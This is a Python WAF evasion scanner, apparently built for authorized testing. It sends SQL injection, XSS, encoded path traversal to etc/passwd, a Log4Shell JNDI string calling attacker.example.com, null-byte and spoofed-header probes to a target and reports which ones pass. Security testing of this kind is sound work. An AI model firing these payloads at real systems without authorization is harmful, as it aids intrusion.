#!/usr/bin/env python3
# © VampSecure Studios — VampSecure Labs Security Research Division
"""
vamp-waf-bypass — WAF evasion tester (authorized security testing only).

Tests 15 bypass techniques against OWASP WAF Top-10 categories.
Exit codes: 2=CRITICAL bypass confirmed, 1=HIGH/MEDIUM, 0=WAF blocking all.
"""
import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional

__version__ = "1.0.0"

# ─── Check catalog ────────────────────────────────────────────────────────────

CHECKS: Dict[str, Dict] = {
    "WAF-001": {
        "title": "WAF ausente o no detectado",
        "severity": "high",
        "category": "Detección",
        "owasp": "OWASP-WAF-C001",
        "description": "No se detectó ningún WAF activo en el objetivo.",
    },
    "WAF-002": {
        "title": "Bypass SQLi — codificación URL simple",
        "severity": "critical",
        "category": "SQLi",
        "owasp": "OWASP-A03:2021",
        "description": "Payload de inyección SQL pasa el WAF con codificación URL estándar.",
    },
    "WAF-003": {
        "title": "Bypass SQLi — doble codificación URL",
        "severity": "critical",
        "category": "SQLi",
        "owasp": "OWASP-A03:2021",
        "description": "Payload SQLi pasa el WAF con doble codificación URL (%2527 → %27 → ').",
    },
    "WAF-004": {
        "title": "Bypass SQLi — comentarios inline",
        "severity": "critical",
        "category": "SQLi",
        "owasp": "OWASP-A03:2021",
        "description": "Payload SQLi con comentarios inline (/*!SELECT*/) evade la detección.",
    },
    "WAF-005": {
        "title": "Bypass XSS — codificación HTML entities",
        "severity": "critical",
        "category": "XSS",
        "owasp": "OWASP-A03:2021",
        "description": "Payload XSS con HTML entities (&lt;script&gt;) no es bloqueado.",
    },
    "WAF-006": {
        "title": "Bypass XSS — variación de mayúsculas",
        "severity": "high",
        "category": "XSS",
        "owasp": "OWASP-A03:2021",
        "description": "Payload XSS con variación de case (ScRiPt) evade el WAF.",
    },
    "WAF-007": {
        "title": "Bypass path traversal — codificado",
        "severity": "critical",
        "category": "LFI/Path Traversal",
        "owasp": "OWASP-A01:2021",
        "description": "Secuencia path traversal codificada (%2e%2e%2f) no es bloqueada.",
    },
    "WAF-008": {
        "title": "Bypass via X-HTTP-Method-Override",
        "severity": "medium",
        "category": "HTTP Method Tampering",
        "owasp": "OWASP-WAF-C006",
        "description": "Header X-HTTP-Method-Override permite cambiar el método HTTP efectivo.",
    },
    "WAF-009": {
        "title": "Bypass via IP spoofing headers",
        "severity": "high",
        "category": "Access Control",
        "owasp": "OWASP-A01:2021",
        "description": "Headers X-Forwarded-For/X-Real-IP permiten falsificar la IP de origen.",
    },
    "WAF-010": {
        "title": "Bypass via User-Agent whitelisting",
        "severity": "medium",
        "category": "Evasión",
        "owasp": "OWASP-WAF-C002",
        "description": "User-Agent de crawler conocido (Googlebot) no es bloqueado por el WAF.",
    },
    "WAF-011": {
        "title": "Bypass Log4Shell / JNDI",
        "severity": "critical",
        "category": "RCE",
        "owasp": "OWASP-A06:2021",
        "description": "Patrón JNDI (${jndi:ldap://...}) no es bloqueado — CVE-2021-44228.",
    },
    "WAF-012": {
        "title": "Bypass null byte injection",
        "severity": "high",
        "category": "Evasión",
        "owasp": "OWASP-A03:2021",
        "description": "Null byte (%00) en parámetros trunca el análisis del WAF.",
    },
    "WAF-013": {
        "title": "Bypass via fragmentación de parámetros",
        "severity": "high",
        "category": "Evasión",
        "owasp": "OWASP-WAF-C003",
        "description": "Payload repartido en múltiples parámetros evita la detección.",
    },
    "WAF-014": {
        "title": "Sin protección contra rate limiting",
        "severity": "medium",
        "category": "Rate Limiting",
        "owasp": "OWASP-A04:2021",
        "description": "No se detecta rate limiting tras múltiples peticiones rápidas.",
    },
    "WAF-015": {
        "title": "Headers WAF revelados en respuesta",
        "severity": "low",
        "category": "Information Disclosure",
        "owasp": "OWASP-A05:2021",
        "description": "Headers de respuesta revelan el producto/versión del WAF.",
    },
}

# ─── WAF fingerprinting signatures ───────────────────────────────────────────

WAF_HEADERS: Dict[str, str] = {
    "x-sucuri-id": "Sucuri",
    "x-sucuri-cache": "Sucuri",
    "x-cache-status": "Varnish/CDN",
    "x-iinfo": "Incapsula",
    "x-cdn": "Imperva/Incapsula",
    "server: cloudflare": "Cloudflare",
    "cf-ray": "Cloudflare",
    "x-firewall-protection": "generic WAF",
    "x-protected-by": "generic WAF",
    "x-waf-event-info": "AWS WAF",
    "x-amzn-requestid": "AWS",
    "x-azure-ref": "Azure",
    "x-fw-hash": "Fortiweb",
    "x-mod-security": "ModSecurity",
    "x-akamai-edgescape": "Akamai",
    "x-check-cacheable": "Akamai",
    "x-barracuda-attack-id": "Barracuda",
    "x-ism-request-id": "ISM",
    "set-cookie: visid_incap": "Incapsula",
    "set-cookie: incap_ses": "Incapsula",
    "set-cookie: __cfduid": "Cloudflare (legacy)",
}

WAF_BLOCK_CODES = {403, 406, 412, 429, 451, 503}
WAF_BLOCK_KEYWORDS = [
    "access denied", "blocked by", "request blocked",
    "security check", "firewall", "waf", "mod_security",
    "incapsula", "cloudflare", "sucuri", "barracuda",
    "you have been blocked", "this request has been blocked",
    "automated queries", "unusual traffic",
]


# ─── Core data structures ─────────────────────────────────────────────────────

@dataclass
class ProbeResult:
    """Resultado de una sonda HTTP (para checks puros/testeables)."""
    url: str
    method: str
    status: int
    headers: Dict[str, str]
    body: str
    elapsed_ms: float
    error: Optional[str] = None

    @property
    def ok(self) -> bool:
        return self.error is None

    @property
    def headers_lower(self) -> Dict[str, str]:
        return {k.lower(): v.lower() for k, v in self.headers.items()}


@dataclass
class Finding:
    check_id: str
    title: str
    severity: str
    category: str
    owasp: str
    description: str
    evidence: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "check_id": self.check_id,
            "title": self.title,
            "severity": self.severity,
            "category": self.category,
            "owasp": self.owasp,
            "description": self.description,
            "evidence": self.evidence,
        }

    @classmethod
    def from_check(cls, cid: str, evidence: Optional[List[str]] = None) -> "Finding":
        c = CHECKS[cid]
        return cls(
            check_id=cid,
            title=c["title"],
            severity=c["severity"],
            category=c["category"],
            owasp=c["owasp"],
            description=c["description"],
            evidence=evidence or [],
        )


# ─── Pure check functions (no I/O — testable) ─────────────────────────────────

def _is_blocked(probe: ProbeResult) -> bool:
    """Heurística: ¿el WAF bloqueó esta petición?"""
    if probe.error:
        return False
    if probe.status in WAF_BLOCK_CODES:
        return True
    body_lower = probe.body.lower()
    return any(kw in body_lower for kw in WAF_BLOCK_KEYWORDS)


def _waf_product(baseline: ProbeResult) -> Optional[str]:
    """Intenta identificar el producto WAF desde los headers."""
    h = baseline.headers_lower
    for sig, product in WAF_HEADERS.items():
        if ":" in sig:
            k, v = sig.split(":", 1)
            if k.strip() in h and v.strip() in h.get(k.strip(), ""):
                return product
        else:
            if sig in h:
                return product
    return None


def check_waf_absent(baseline: ProbeResult, malicious: ProbeResult) -> Optional[Finding]:
    """WAF-001: WAF ausente — ni el baseline ni la petición maliciosa es bloqueada."""
    if not baseline.ok or not malicious.ok:
        return None
    product = _waf_product(baseline)
    if product:
        return None
    if _is_blocked(malicious):
        return None
    return Finding.from_check("WAF-001", [
        f"Baseline status: {baseline.status}",
        f"Malicious status: {malicious.status}",
        "No WAF headers/block indicators detected",
    ])


def check_sqli_url_encoded(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-002: SQLi con codificación URL estándar no bloqueado."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    if baseline.status != probe.status:
        return None
    return Finding.from_check("WAF-002", [
        "Payload: %27+OR+%271%27%3D%271",
        f"Status: {probe.status} (same as baseline — not blocked)",
    ])


def check_sqli_double_encoded(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-003: SQLi con doble codificación URL no bloqueado."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    return Finding.from_check("WAF-003", [
        "Payload: %2527+OR+%25271%2527%253D%25271 (double-encoded)",
        f"Status: {probe.status}",
    ])


def check_sqli_inline_comment(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-004: SQLi con comentarios MySQL inline no bloqueado."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    return Finding.from_check("WAF-004", [
        "Payload: /*!50000SELECT*/ 1,2,3",
        f"Status: {probe.status}",
    ])


def check_xss_html_entities(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-005: XSS con HTML entities no bloqueado."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    return Finding.from_check("WAF-005", [
        "Payload: &lt;script&gt;alert(1)&lt;/script&gt;",
        f"Status: {probe.status}",
    ])


def check_xss_case_variation(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-006: XSS con variación de mayúsculas no bloqueado."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    return Finding.from_check("WAF-006", [
        "Payload: <ScRiPt>alert(1)</ScRiPt>",
        f"Status: {probe.status}",
    ])


def check_path_traversal_encoded(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-007: Path traversal con codificación URL no bloqueado."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    return Finding.from_check("WAF-007", [
        "Payload: %2e%2e%2f%2e%2e%2fetc%2fpasswd",
        f"Status: {probe.status}",
    ])


def check_http_method_override(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-008: X-HTTP-Method-Override no restringido."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    if probe.status in {200, 201, 204, 405}:
        return Finding.from_check("WAF-008", [
            "Header: X-HTTP-Method-Override: DELETE",
            f"Response status: {probe.status} (method accepted or not blocked)",
        ])
    return None


def check_ip_spoof_headers(
    baseline: ProbeResult, probe_local: ProbeResult, probe_admin: ProbeResult
) -> Optional[Finding]:
    """WAF-009: Headers X-Forwarded-For/X-Real-IP no validados."""
    findings_ev = []
    for probe, hdr in [(probe_local, "X-Forwarded-For: 127.0.0.1"),
                       (probe_admin, "X-Real-IP: 10.0.0.1")]:
        if probe.ok and not _is_blocked(probe):
            if probe.status == baseline.status:
                findings_ev.append(f"{hdr} → status {probe.status} (same as baseline)")
    if findings_ev:
        return Finding.from_check("WAF-009", findings_ev)
    return None


def check_useragent_whitelist(
    baseline: ProbeResult, probe_blocked: ProbeResult, probe_bot: ProbeResult
) -> Optional[Finding]:
    """WAF-010: WAF bloquea UA normal pero no crawler conocido."""
    if not probe_blocked.ok or not probe_bot.ok:
        return None
    if _is_blocked(probe_blocked) and not _is_blocked(probe_bot):
        return Finding.from_check("WAF-010", [
            f"Blocked UA (malicious payload) → {probe_blocked.status}",
            f"Googlebot UA (same payload) → {probe_bot.status} (not blocked)",
        ])
    return None


def check_log4shell(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-011: Patrón JNDI no bloqueado."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    return Finding.from_check("WAF-011", [
        "Payload: ${jndi:ldap://attacker.example.com/exploit}",
        f"Status: {probe.status} (JNDI pattern not blocked)",
    ])


def check_null_byte(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-012: Null byte no bloqueado."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    return Finding.from_check("WAF-012", [
        "Payload: evil%00normal (null byte injection)",
        f"Status: {probe.status}",
    ])


def check_param_fragmentation(
    baseline: ProbeResult, probe: ProbeResult
) -> Optional[Finding]:
    """WAF-013: Payload fragmentado entre parámetros no detectado."""
    if not probe.ok:
        return None
    if _is_blocked(probe):
        return None
    if baseline.status == probe.status:
        return Finding.from_check("WAF-013", [
            "Payload: ?a=SEL&b=ECT (fragmented across params)",
            f"Status: {probe.status} (not blocked)",
        ])
    return None


def check_rate_limiting(probes: List[ProbeResult]) -> Optional[Finding]:
    """WAF-014: Sin rate limiting — todas las peticiones responden 200."""
    if not probes:
        return None
    statuses = [p.status for p in probes if p.ok]
    if not statuses:
        return None
    rate_limited = any(s in {429, 503} for s in statuses)
    if rate_limited:
        return None
    return Finding.from_check("WAF-014", [
        f"{len(statuses)} rapid requests, all returned {set(statuses)}",
        "No 429/503 rate-limit response detected",
    ])


def check_waf_disclosure(baseline: ProbeResult) -> Optional[Finding]:
    """WAF-015: Headers revelan producto/versión del WAF."""
    if not baseline.ok:
        return None
    h = baseline.headers_lower
    disclosed = []
    version_headers = [
        "server", "x-powered-by", "x-aspnet-version", "x-generator",
        "x-sucuri-id", "x-mod-security", "x-barracuda-attack-id",
    ]
    for hdr in version_headers:
        if hdr in h:
            val = h[hdr]
            if re.search(r"\d+\.\d+", val):
                disclosed.append(f"{hdr}: {val}")
    if disclosed:
        return Finding.from_check("WAF-015", disclosed)
    return None


# ─── HTTP prober ──────────────────────────────────────────────────────────────

DEFAULT_UA = "Mozilla/5.0 (compatible; vamp-waf-bypass/1.0; authorized security testing)"
TIMEOUT = 10


def _http(
    url: str,
    method: str = "GET",
    params: Optional[Dict[str, str]] = None,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = TIMEOUT,
) -> ProbeResult:
    """Realiza una petición HTTP sin dependencias externas."""
    if params:
        qs = urllib.parse.urlencode(params)
        url = f"{url}{'&' if '?' in url else '?'}{qs}"

    req = urllib.request.Request(url, method=method)
    req.add_header("User-Agent", DEFAULT_UA)
    req.add_header("Accept", "*/*")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            elapsed = (time.monotonic() - t0) * 1000
            body = resp.read(8192).decode("utf-8", errors="replace")
            resp_headers = {k: v for k, v in resp.headers.items()}
            return ProbeResult(
                url=url, method=method, status=resp.status,
                headers=resp_headers, body=body, elapsed_ms=elapsed,
            )
    except urllib.error.HTTPError as e:
        elapsed = (time.monotonic() - t0) * 1000
        body = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        resp_headers = {k: v for k, v in e.headers.items()} if e.headers else {}
        return ProbeResult(
            url=url, method=method, status=e.code,
            headers=resp_headers, body=body, elapsed_ms=elapsed,
        )
    except Exception as exc:
        elapsed = (time.monotonic() - t0) * 1000
        return ProbeResult(
            url=url, method=method, status=0,
            headers={}, body="", elapsed_ms=elapsed, error=str(exc),
        )


# ─── High-level scan ──────────────────────────────────────────────────────────

SQLI_PAYLOADS = {
    "url_encoded":      "' OR '1'='1",
    "double_encoded":   "%27 OR %271%27=%271",
    "inline_comment":   "/*!50000SELECT*/ 1,2,3",
}
XSS_PAYLOADS = {
    "html_entities":    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "case_variation":   "<ScRiPt>alert(1)</ScRiPt>",
}
TRAVERSAL_PAYLOAD = "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
JNDI_PAYLOAD = "${jndi:ldap://attacker.example.com/exploit}"
NULL_BYTE_PAYLOAD = "evil%00normal"
GOOGLEBOT_UA = ("Mozilla/5.0 (compatible; Googlebot/2.1; "
                "+http://www.google.com/bot.html)")


def scan(target: str, param: str = "q", rate_n: int = 8) -> List[Finding]:
    """Ejecuta todos los checks de bypass contra el objetivo."""
    findings: List[Finding] = []
    base_url = target.rstrip("/")

    # Baseline
    baseline = _http(base_url)
    if baseline.error:
        return findings

    # WAF-015: disclosure antes de cualquier payload
    f = check_waf_disclosure(baseline)
    if f:
        findings.append(f)

    # Petición "maliciosa" genérica para WAF-001
    mal = _http(base_url, params={param: "' OR 1=1--"})
    f = check_waf_absent(baseline, mal)
    if f:
        findings.append(f)

    # SQLi checks
    sqli_url = _http(base_url, params={param: SQLI_PAYLOADS["url_encoded"]})
    f = check_sqli_url_encoded(baseline, sqli_url)
    if f:
        findings.append(f)

    sqli_dbl = _http(base_url, params={param: SQLI_PAYLOADS["double_encoded"]})
    f = check_sqli_double_encoded(baseline, sqli_dbl)
    if f:
        findings.append(f)

    sqli_cmt = _http(base_url, params={param: SQLI_PAYLOADS["inline_comment"]})
    f = check_sqli_inline_comment(baseline, sqli_cmt)
    if f:
        findings.append(f)

    # XSS checks
    xss_ent = _http(base_url, params={param: XSS_PAYLOADS["html_entities"]})
    f = check_xss_html_entities(baseline, xss_ent)
    if f:
        findings.append(f)

    xss_case = _http(base_url, params={param: XSS_PAYLOADS["case_variation"]})
    f = check_xss_case_variation(baseline, xss_case)
    if f:
        findings.append(f)

    # Path traversal
    trav = _http(base_url, params={param: TRAVERSAL_PAYLOAD})
    f = check_path_traversal_encoded(baseline, trav)
    if f:
        findings.append(f)

    # HTTP method override
    override = _http(base_url, method="POST",
                     headers={"X-HTTP-Method-Override": "DELETE",
                               "Content-Length": "0"})
    f = check_http_method_override(baseline, override)
    if f:
        findings.append(f)

    # IP spoof
    probe_local = _http(base_url, headers={"X-Forwarded-For": "127.0.0.1"})
    probe_admin = _http(base_url, headers={"X-Real-IP": "10.0.0.1"})
    f = check_ip_spoof_headers(baseline, probe_local, probe_admin)
    if f:
        findings.append(f)

    # UA whitelist bypass
    malicious_payload = _http(base_url, params={param: "' OR 1=1--"})
    bot_probe = _http(base_url, params={param: "' OR 1=1--"},
                      headers={"User-Agent": GOOGLEBOT_UA})
    f = check_useragent_whitelist(baseline, malicious_payload, bot_probe)
    if f:
        findings.append(f)

    # Log4Shell
    log4j = _http(base_url, params={param: JNDI_PAYLOAD},
                  headers={"X-Api-Version": JNDI_PAYLOAD})
    f = check_log4shell(baseline, log4j)
    if f:
        findings.append(f)

    # Null byte
    null_b = _http(base_url, params={param: NULL_BYTE_PAYLOAD})
    f = check_null_byte(baseline, null_b)
    if f:
        findings.append(f)

    # Param fragmentation
    frag = _http(base_url, params={"a": "SEL", "b": "ECT 1,2,3 FROM users--"})
    f = check_param_fragmentation(baseline, frag)
    if f:
        findings.append(f)

    # Rate limiting
    rl_probes = [_http(base_url) for _ in range(rate_n)]
    f = check_rate_limiting(rl_probes)
    if f:
        findings.append(f)

    return findings


# ─── Report generation ────────────────────────────────────────────────────────

def build_report(
    target: str,
    findings: List[Finding],
    case_id: str = "",
    analyst: str = "",
) -> dict:
    summary = {"critical": 0, "high": 0, "medium": 0, "low": 0, "total": 0}
    for f in findings:
        sev = f.severity
        if sev in summary:
            summary[sev] += 1
        summary["total"] += 1
    return {
        "tool": "vamp-waf-bypass",
        "version": __version__,
        "target": target,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "case_id": case_id,
        "analyst": analyst,
        "summary": summary,
        "findings": [f.to_dict() for f in findings],
    }


def render_html(report: dict) -> str:
    sev_color = {
        "critical": "#ff4d4d", "high": "#ff8c00",
        "medium": "#ffd700", "low": "#7ec8e3",
    }
    rows = ""
    for f in report["findings"]:
        col = sev_color.get(f["severity"], "#888")
        ev_html = "".join(f"<li>{_h(e)}</li>" for e in f["evidence"])
        rows += f"""
        <tr>
          <td><code>{_h(f['check_id'])}</code></td>
          <td><span class='sev' style='background:{col}'>{_h(f['severity'].upper())}</span></td>
          <td>{_h(f['title'])}</td>
          <td>{_h(f['category'])}</td>
          <td><small>{_h(f['owasp'])}</small></td>
          <td><ul style='margin:0;padding-left:1.2em'>{ev_html}</ul></td>
        </tr>"""

    s = report["summary"]
    def badge(sev, c):
        return (f"<span class='badge' style='background:{sev_color[sev]}'>"
                f"{c} {sev.upper()}</span>")
    return f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WAF Bypass Report — {_h(report['target'])}</title>
<style>
:root{{--bg:#0d1117;--fg:#e6edf3;--card:#161b22;--border:#30363d;--mono:'JetBrains Mono',monospace}}
*{{box-sizing:border-box}}
body{{margin:0;padding:2rem;background:var(--bg);color:var(--fg);font-family:Inter,system-ui,sans-serif;font-size:14px}}
h1{{font-size:1.4rem;margin-bottom:.25rem}}
.meta{{color:#8b949e;font-size:.85rem;margin-bottom:2rem}}
.badges{{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:2rem}}
.badge{{padding:.25rem .7rem;border-radius:4px;font-size:.75rem;font-weight:700;color:#fff}}
.sev{{padding:.15rem .5rem;border-radius:3px;font-size:.7rem;font-weight:700;color:#000}}
table{{width:100%;border-collapse:collapse;font-size:.8rem}}
th{{background:var(--card);padding:.6rem .8rem;text-align:left;border-bottom:2px solid var(--border)}}
td{{padding:.55rem .8rem;border-bottom:1px solid var(--border);vertical-align:top}}
tr:hover td{{background:var(--card)}}
code{{font-family:var(--mono);font-size:.8em;background:#1f242b;padding:.1rem .35rem;border-radius:3px}}
ul{{margin:.3rem 0 0}}li{{margin-bottom:.2rem}}
.footer{{margin-top:3rem;color:#8b949e;font-size:.75rem}}
</style>
</head>
<body>
<h1>WAF Bypass Report</h1>
<div class="meta">
  Target: <code>{_h(report['target'])}</code> &nbsp;|&nbsp;
  {_h(report['timestamp'])}
  {' &nbsp;|&nbsp; Case: ' + _h(report['case_id']) if report['case_id'] else ''}
  {' &nbsp;|&nbsp; Analyst: ' + _h(report['analyst']) if report['analyst'] else ''}
</div>
<div class="badges">
  {badge('critical', s['critical'])}
  {badge('high', s['high'])}
  {badge('medium', s['medium'])}
  {badge('low', s['low'])}
</div>
<table>
<thead><tr>
  <th>Check</th><th>Severity</th><th>Title</th><th>Category</th><th>OWASP</th><th>Evidence</th>
</tr></thead>
<tbody>{rows if rows else '<tr><td colspan="6" style="text-align:center;padding:2rem">No bypasses detected — WAF blocking correctly.</td></tr>'}</tbody>
</table>
<div class="footer">Generated by vamp-waf-bypass v{_h(__version__)} · VampSecure Labs · AUTHORIZED SECURITY TESTING ONLY</div>
</body></html>"""


def _h(s: object) -> str:
    return (str(s)
            .replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main(argv: Optional[List[str]] = None) -> int:
    p = argparse.ArgumentParser(
        prog="vamp-waf-bypass",
        description=(
            "WAF evasion tester — OWASP WAF bypass checks (authorized testing only). "
            "Exit: 2=CRITICAL bypass, 1=HIGH/MEDIUM, 0=WAF blocking all."
        ),
    )
    p.add_argument("target", help="Target URL (e.g. https://example.com)")
    p.add_argument("--param", default="q",
                   help="GET parameter to inject payloads into (default: q)")
    p.add_argument("--rate-n", type=int, default=8,
                   help="Number of rapid requests for rate-limit check (default: 8)")
    p.add_argument("--json", metavar="FILE",
                   help="Write JSON report to FILE ('-' for stdout)")
    p.add_argument("--html", metavar="FILE",
                   help="Write HTML report to FILE")
    p.add_argument("--severity", nargs="+",
                   choices=["critical", "high", "medium", "low"],
                   help="Only show findings at these severities")
    p.add_argument("--case", default="", metavar="ID", help="Case reference ID")
    p.add_argument("--analyst", default="", help="Analyst name")
    p.add_argument("--quiet", action="store_true", help="Suppress stdout output")
    p.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    args = p.parse_args(argv)

    if not args.quiet:
        print(f"[*] vamp-waf-bypass {__version__} — target: {args.target}", file=sys.stderr)

    findings = scan(args.target, param=args.param, rate_n=args.rate_n)

    if args.severity:
        findings = [f for f in findings if f.severity in args.severity]

    report = build_report(args.target, findings, args.case, args.analyst)

    if not args.quiet:
        s = report["summary"]
        print(
            f"[*] Results: {s['critical']} CRITICAL  {s['high']} HIGH  "
            f"{s['medium']} MEDIUM  {s['low']} LOW",
            file=sys.stderr,
        )
        for f in findings:
            print(f"  [{f.severity.upper():8s}] {f.check_id}: {f.title}", file=sys.stderr)

    if args.json:
        out = json.dumps(report, indent=2, ensure_ascii=False)
        if args.json == "-":
            print(out)
        else:
            Path(args.json).write_text(out, encoding="utf-8")

    if args.html:
        Path(args.html).write_text(render_html(report), encoding="utf-8")

    critical = any(f.severity == "critical" for f in findings)
    high_or_med = any(f.severity in {"high", "medium"} for f in findings)
    if critical:
        return 2
    if high_or_med:
        return 1
    return 0


def main_entry() -> None:
    sys.exit(main())


if __name__ == "__main__":
    main_entry()
